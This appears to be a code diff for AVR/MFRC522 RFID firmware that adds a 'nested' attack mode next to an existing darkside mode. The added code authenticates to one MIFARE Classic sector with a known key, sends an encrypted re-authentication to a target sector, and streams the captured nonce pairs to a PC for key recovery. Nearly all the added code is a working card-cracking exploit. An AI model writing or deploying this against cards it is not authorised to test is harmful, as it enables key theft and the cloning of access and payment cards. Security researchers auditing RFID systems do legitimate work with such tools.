@@ -13,6 +13,7 @@
 #define MODE_WRITE      3
 #define MODE_WRITE_BLK0 4
 #define MODE_DARKSIDE   5
+#define MODE_NESTED     6
 
 // Print chip type and cloneability based on SAK byte (human-readable)
 static void print_chip_info(uint8_t sak) {
@@ -456,6 +457,9 @@ static uint8_t do_scan(void) {
 static uint8_t write_uid[5];
 static uint8_t write_authenticated_sector;
 static uint8_t dark_sector;
+static uint8_t nested_known_block;
+static uint8_t nested_target_block;
+static uint8_t nested_key[6];
 
 static uint8_t parse_hex_byte(const char *s) {
     uint8_t hi = hex_char_to_val(s[0]);
@@ -695,6 +699,76 @@ static void do_darkside_round(void) {
     mfrc522_halt();
 }
 
+static void do_nested_collect(void) {
+    uint8_t uid[5];
+    uint8_t nt_known[4];
+    crypto1_state cs;
+
+    // Step 1: Manual auth to known sector
+    uint8_t status = manual_auth(nested_known_block, nested_key, uid,
+                                 nt_known, &cs, 500);
+    if (status != MI_OK) {
+        uart_puts("NESTED:FAIL:AUTH\r\n");
+        return;
+    }
+
+    // Step 2: Send encrypted AUTH for target sector
+    // The card is in encrypted mode (our software crypto tracks state)
+    // RC522 crypto is OFF, so we encrypt in software
+
+    uint8_t auth_cmd[4];
+    auth_cmd[0] = PICC_AUTHKA;
+    auth_cmd[1] = nested_target_block;
+
+    // Compute CRC on plaintext
+    // Note: CRC is computed on plaintext, then encrypted with the data
+    // Actually for MIFARE Classic re-auth, the CRC calculation is on the
+    // plaintext command, then everything (cmd + CRC) is encrypted
+    mfrc522_calculate_crc(auth_cmd, 2, &auth_cmd[2]);
+
+    // Check parity for 4 encrypted bytes
+    crypto1_state cs_par = cs;
+    if (!parity_check_ok(&cs_par, 4)) {
+        uart_puts("NESTED:FAIL:PARITY\r\n");
+        mfrc522_halt();
+        return;
+    }
+
+    // Encrypt the 4 bytes
+    uint8_t enc_cmd[4];
+    for (uint8_t i = 0; i < 4; i++) {
+        enc_cmd[i] = auth_cmd[i] ^ crypto1_byte(&cs, auth_cmd[i], 0);
+    }
+
+    // Send encrypted auth command, expect 4-byte plaintext nonce
+    // After receiving re-auth, card drops crypto and sends nt in plaintext
+    mfrc522_clear_bit(TxModeReg, 0x80);  // No CRC (already in encrypted data)
+    mfrc522_clear_bit(RxModeReg, 0x80);
+
+    uint8_t nt_target[4];
+    uint8_t back_len;
+    status = mfrc522_to_card(PCD_Transceive, enc_cmd, 4, nt_target, &back_len);
+
+    // Restore CRC settings
+    mfrc522_set_bit(TxModeReg, 0x80);
+    mfrc522_set_bit(RxModeReg, 0x80);
+
+    if (status != MI_OK || back_len != 32) {
+        uart_puts("NESTED:FAIL:TARGET\r\n");
+        mfrc522_halt();
+        return;
+    }
+
+    // Send nonce pair to PC
+    uart_puts("NESTED:NT:");
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_known[i]);
+    uart_putc(':');
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_target[i]);
+    uart_puts("\r\n");
+
+    mfrc522_halt();
+}
+
 int main(void) {
     uint8_t scan_mode = MODE_IDLE;
     char line_buf[48];
@@ -790,6 +864,27 @@ int main(void) {
                         }
                     }
                     break;
+                case 'N':
+                    // Parse: N<known_blk_2hex><target_blk_2hex><key_12hex>
+                    // Total: 1 + 2 + 2 + 12 = 17 chars
+                    scan_mode = MODE_NESTED;
+                    // Read remaining bytes (block until we have them or timeout)
+                    {
+                        uint8_t nbuf[16];
+                        uint8_t ni = 0;
+                        while (ni < 16) {
+                            if (uart_available()) {
+                                nbuf[ni++] = uart_getc();
+                            }
+                        }
+                        nested_known_block = parse_hex_byte((char*)&nbuf[0]);
+                        nested_target_block = parse_hex_byte((char*)&nbuf[2]);
+                        for (uint8_t i = 0; i < 6; i++) {
+                            nested_key[i] = parse_hex_byte((char*)&nbuf[4 + i*2]);
+                        }
+                    }
+                    uart_puts("OK:NESTED_START\r\n");
+                    break;
                 }
             }
         }
@@ -809,6 +904,28 @@ int main(void) {
             }
             do_darkside_round();
             _delay_ms(5);  // brief pause between rounds
+            continue;
+        }
+
+        if (scan_mode == MODE_NESTED) {
+            static uint8_t nested_rounds = 0;
+            if (uart_available()) {
+                char c = uart_getc();
+                if (c == 'X' || c == 'P') {
+                    scan_mode = MODE_IDLE;
+                    nested_rounds = 0;
+                    uart_puts("NESTED:DONE\r\n");
+                    continue;
+                }
+            }
+            do_nested_collect();
+            nested_rounds++;
+            if (nested_rounds >= 5) {
+                uart_puts("NESTED:DONE\r\n");
+                scan_mode = MODE_IDLE;
+                nested_rounds = 0;
+            }
+            _delay_ms(10);
             continue;
         }
 
